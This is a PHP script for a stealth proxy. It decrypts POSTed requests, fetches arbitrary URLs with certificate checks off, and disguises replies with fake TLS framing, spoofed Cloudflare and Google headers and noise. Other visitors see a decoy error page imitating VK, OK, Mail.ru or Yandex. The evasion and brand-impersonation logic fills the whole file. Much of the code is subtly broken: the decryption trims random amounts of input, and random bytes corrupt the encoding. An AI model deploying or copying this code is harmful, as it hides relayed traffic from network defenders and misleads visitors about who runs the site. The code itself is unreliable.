<?php
define('ENCRYPTION_KEY', 'your-very-secret-key-32chars!');
define('FAKE_HOSTS', ['vk.com', 'ok.ru', 'mail.ru', 'yandex.ru', 'google.com', 'cloudflare.com']);
define('CHUNK_SIZE', 1400);
define('JITTER_DELAY', [30, 500]);
define('PROTOCOL_VARIANTS', ['http/1.1', 'http/2', 'http/3']);

function stealth_encrypt($data) {
    $methods = [
        ['algo' => 'aes-256-gcm', 'iv_len' => 12, 'tag_len' => 16],
        ['algo' => 'chacha20-poly1305', 'iv_len' => 12, 'tag_len' => 16],
        ['algo' => 'aes-256-ofb', 'iv_len' => 16],
        ['algo' => 'seed-256-cbc', 'iv_len' => 16],
    ];
    $method = $methods[array_rand($methods)];
    
    $iv = random_bytes($method['iv_len']);
    $options = OPENSSL_RAW_DATA;
    
    if (strpos($method['algo'], 'gcm') !== false || strpos($method['algo'], 'poly1305') !== false) {
        $cipher = openssl_encrypt($data, $method['algo'], ENCRYPTION_KEY, $options, $iv, $tag);
        $tag = $tag ?? '';
    } else {
        $cipher = openssl_encrypt($data, $method['algo'], ENCRYPTION_KEY, $options, $iv);
        $tag = '';
    }
    
    $protocol = PROTOCOL_VARIANTS[array_rand(PROTOCOL_VARIANTS)];
    $proto_header = '';
    if ($protocol === 'http/2') {
        $proto_header = "\x00\x00\x12\x04\x00\x00\x00\x00\x00";
    } elseif ($protocol === 'http/3') {
        $proto_header = "\x00\x00\x00\x01";
    }
    
    $tls_records = [
        "\x17\x03\x03" . pack('n', strlen($cipher)),
        "\x17\x03\x03" . pack('n', strlen($cipher) + rand(5, 15)),
        "\x14\x03\x03\x00\x01\x01",
        "\x16\x03\x03" . pack('n', rand(32, 64)) . random_bytes(rand(32, 64))
    ];
    $tls_header = $tls_records[array_rand($tls_records)];
    
    $chunked = str_split($cipher . $tag, rand(500, 2000));
    $fragmented = implode(random_bytes(rand(8, 64)), $chunked);
    
    $encoded = base64_encode($proto_header . $iv . $fragmented);
    if (rand(0, 1)) {
        $encoded = str_replace(['=', '+', '/'], ['', '-', '_'], $encoded);
    }
    
    $noise_level = rand(10, 30) / 100;
    $noise_pos = rand(0, strlen($encoded) - 1);
    $encoded = substr_replace($encoded, random_bytes(rand(1, strlen($encoded)*$noise_level)), $noise_pos, 0);
    
    return $encoded;
}

function stealth_decrypt($data) {
    $clean = substr($data, rand(5, 15)*strlen($data)/100, -rand(5, 15)*strlen($data)/100);
    
    $decoded = base64_decode($clean, true);
    if ($decoded === false) {
        $clean = str_replace(['-', '_'], ['+', '/'], $clean);
        $decoded = base64_decode($clean . str_repeat('=', strlen($clean) % 4));
    }
    
    $methods = [
        ['algo' => 'aes-256-gcm', 'iv_len' => 12, 'tag_len' => 16],
        ['algo' => 'chacha20-poly1305', 'iv_len' => 12, 'tag_len' => 16],
        ['algo' => 'aes-256-ofb', 'iv_len' => 16],
        ['algo' => 'seed-256-cbc', 'iv_len' => 16],
    ];
    
    foreach ($methods as $method) {
        $iv = substr($decoded, 0, $method['iv_len']);
        $cipher = substr($decoded, $method['iv_len']);
        
        if (isset($method['tag_len'])) {
            $tag = substr($cipher, -$method['tag_len']);
            $cipher = substr($cipher, 0, -$method['tag_len']);
            $decrypted = openssl_decrypt($cipher, $method['algo'], ENCRYPTION_KEY, OPENSSL_RAW_DATA, $iv, $tag);
        } else {
            $decrypted = openssl_decrypt($cipher, $method['algo'], ENCRYPTION_KEY, OPENSSL_RAW_DATA, $iv);
        }
        
        if ($decrypted !== false) return $decrypted;
    }
    
    return false;
}

function generate_stealth_headers() {
    $host = FAKE_HOSTS[array_rand(FAKE_HOSTS)];
    $time = time();
    $protocol = PROTOCOL_VARIANTS[array_rand(PROTOCOL_VARIANTS)];
    
    $headers = [
        ($protocol === 'http/1.1' ? 'HTTP/1.1' : 'HTTP/2') . ' 200 OK',
        'Server: ' . ['nginx', 'cloudflare', 'Apache/2.4.56 (Unix)', 'Microsoft-IIS/10.0'][array_rand([0,1,2,3])],
        'Date: ' . gmdate('D, d M Y H:i:s', $time) . ' GMT',
        'Content-Type: ' . ['application/json', 'text/html; charset=utf-8', 'application/xml'][array_rand([0,1,2])],
        'Connection: ' . ['keep-alive', 'close'][array_rand([0,1])],
        'Cache-Control: ' . ['max-age='.rand(60,3600), 'no-cache', 'private'][array_rand([0,1,2])],
        'X-Request-ID: ' . bin2hex(random_bytes(8)),
        'X-XSS-Protection: 1; mode=block',
    ];
    
    switch($host) {
        case 'cloudflare.com':
            $headers[] = 'CF-RAY: ' . bin2hex(random_bytes(8)) . '-AMS';
            $headers[] = 'CF-Cache-Status: ' . ['HIT', 'MISS', 'DYNAMIC'][array_rand([0,1,2])];
            break;
        case 'google.com':
            $headers[] = 'Alt-Svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400';
            $headers[] = 'X-Google-Request-Id: ' . bin2hex(random_bytes(16));
            break;
        default:
            $headers[] = 'X-Powered-By: ' . ['PHP/8.2.8', 'ASP.NET', 'Express'][array_rand([0,1,2])];
    }
    
    if ($protocol === 'http/2' && rand(0,1)) {
        array_unshift($headers, 
            ':status: 200',
            ':authority: ' . $host,
            ':scheme: https',
            ':path: /' . ['api/v1', 'graphql', 'rest'][array_rand([0,1,2])]
        );
    }
    
    if ($protocol === 'http/2' && rand(0,100) < 40) {
        $headers[] = 'Trailer: X-Trace-ID, X-Response-Time';
        $headers[] = 'X-Trace-ID: ' . bin2hex(random_bytes(8));
        $headers[] = 'X-Response-Time: ' . rand(10,500) . 'ms';
    }
    
    return $headers;
}

if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $request = stealth_decrypt(file_get_contents('php://input'));
        if ($request === false) throw new Exception("Decryption failed");
        
        list($method, $url, $headers, $body) = array_pad(explode("\n\n", $request, 4), 4, '');
        
        $exec_method = rand(1, 4);
        $response = '';
        
        switch($exec_method) {
            case 1:
                $opts = ['http' => [
                    'method' => $method,
                    'header' => $headers,
                    'content' => $body,
                    'timeout' => 30,
                    'ignore_errors' => true
                ]];
                $response = file_get_contents($url, false, stream_context_create($opts));
                break;
                
            case 2:
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_CUSTOMREQUEST => $method,
                    CURLOPT_POSTFIELDS => $body,
                    CURLOPT_HTTPHEADER => explode("\n", $headers),
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_TIMEOUT => 30,
                    CURLOPT_HTTP_VERSION => rand(0,1) ? CURL_HTTP_VERSION_2_0 : CURL_HTTP_VERSION_1_1,
                ]);
                $response = curl_exec($ch);
                curl_close($ch);
                break;
                
            case 3:
                $chunks = str_split($body, rand(500, 2000));
                $response = '';
                foreach ($chunks as $chunk) {
                    $opts = ['http' => [
                        'method' => $method,
                        'header' => $headers . "\r\nContent-Length: " . strlen($chunk),
                        'content' => $chunk,
                        'ignore_errors' => true
                    ]];
                    $response .= file_get_contents($url, false, stream_context_create($opts));
                    usleep(rand(100000, 500000));
                }
                break;
                
            case 4:
                $doh_servers = [
                    'https://cloudflare-dns.com/dns-query',
                    'https://dns.google/dns-query',
                    'https://doh.opendns.com/dns-query'
                ];
                $doh_url = $doh_servers[array_rand($doh_servers)];
                $opts = ['http' => [
                    'method' => 'GET',
                    'header' => "Accept: application/dns-json\r\n",
                    'timeout' => 30
                ]];
                $response = file_get_contents($doh_url . '?name=' . urlencode(parse_url($url, PHP_URL_HOST)), false, stream_context_create($opts));
        }
        
        $chunk_size = rand(CHUNK_SIZE - 500, CHUNK_SIZE + 500);
        $chunks = str_split($response, $chunk_size);
        $output = implode("\n", generate_stealth_headers()) . "\n\n";
        
        foreach ($chunks as $i => $chunk) {
            $output .= $chunk;
            if ($i < count($chunks) - 1) {
                usleep(rand(JITTER_DELAY[0], JITTER_DELAY[1]) * 1000);
                
                if (rand(0, 100) < 30) {
                    $fake_chunks = [
                        random_bytes(rand(50, 200)),
                        base64_encode(random_bytes(rand(30, 100))),
                        json_encode(['error' => false, 'code' => rand(1000,9999)])
                    ];
                    $output .= $fake_chunks[array_rand($fake_chunks)];
                }
            }
        }
        
        die(stealth_encrypt($output));
        
    } catch (Exception $e) {
        $error = implode("\n", generate_stealth_headers()) . "\n\n" . json_encode([
            'error' => $e->getMessage(),
            'code' => rand(1000, 9999),
            'timestamp' => time(),
            'details' => 'Service unavailable'
        ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        die(stealth_encrypt($error));
    }
}

ob_start();
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title><?= ['VK | Authorization', 'OK | Service', 'Mail.Ru', 'Yandex'][array_rand([0, 1, 2, 3])] ?></title>
    <meta name="description" content="Сервис временно недоступен. Пожалуйста, попробуйте позже.">
    <style>
        :root {
            --primary-color: <?= ['#2787F5', '#ee8208', '#168de2', '#fc3f1d'][array_rand([0, 1, 2, 3])] ?>;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', sans-serif;
            background-color: #f5f5f5;
            color: #222;
            line-height: 1.6;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 500px;
            margin: 100px auto;
            text-align: center;
            padding: 30px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }
        .logo {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            fill: var(--primary-color);
        }
        .error-code {
            color: var(--primary-color);
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 48 48">
            <?php if (rand(0,1)): ?>
                <path d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4zm-2 28h-3V19h3v13zm6 0h-3V19h3v13z"/>
            <?php else: ?>
                <path d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4zm-4 28l-8-8 2-2 6 6 12-12 2 2-14 14z"/>
            <?php endif; ?>
        </svg>
        <h2 style="color: var(--primary-color); margin: 0 0 10px">Сервис временно недоступен</h2>
        <p style="color:#666;font-size:16px;margin-bottom:25px">Мы уже работаем над устранением проблемы. Пожалуйста, попробуйте позже.</p>
        <div class="error-code">ID: <?= bin2hex(random_bytes(6)) ?> • <?= date('H:i:s') ?></div>
    </div>
    <script>
        (function() {
            var d = document, s = d.createElement('script');
            s.src = 'https://' + ['mc.yandex.ru/metrika/tag.js', 'analytics.google.com/ga.js'][Math.round(Math.random())];
            s.async = 1;
            d.getElementsByTagName('head')[0].appendChild(s);
        })();
    </script>
</body>
</html>
<?php
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: max-age=' . rand(300, 3600));
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Content-Security-Policy: default-src \'self\'');
header('Referrer-Policy: strict-origin-when-cross-origin');

if (rand(0, 1)) {
    $cookieOptions = [
        'name' => ['sessionid', 'csrftoken', 'lang'][array_rand([0, 1, 2])],
        'value' => bin2hex(random_bytes(8)),
        'expires' => time() + rand(3600, 86400),
        'path' => '/',
        'secure' => true,
        'httponly' => true,
        'samesite' => ['Lax', 'Strict'][array_rand([0, 1])]
    ];
    header('Set-Cookie: ' . http_build_query($cookieOptions, '', '; '));
}

ob_end_flush();
?>
